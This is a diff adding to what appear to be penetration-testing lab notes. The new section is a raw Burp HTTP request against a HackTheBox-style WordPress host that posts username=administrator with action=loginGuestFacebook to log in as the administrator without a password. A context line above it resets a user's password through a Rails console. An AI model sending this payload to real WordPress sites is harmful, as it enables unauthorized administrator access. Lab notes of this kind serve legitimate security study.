@@ -260,3 +260,22 @@ user.password = 'password1'
 user.password_confirmation = 'password1'
 user.save!
 ```
+
+### Burp Form Post
+```
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: brainfuck.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 58
+Origin: https://brainfuck.htb
+Connection: close
+Referer: https://brainfuck.htb/wp-login.php?redirect_to=https%3A%2F%2Fbrainfuck.htb%2Fwp-admin%2F&reauth=1
+Cookie: wordpress_test_cookie=WP+Cookie+check
+Upgrade-Insecure-Requests: 1
+
+username=administrator&email=sth&action=loginGuestFacebook
+```
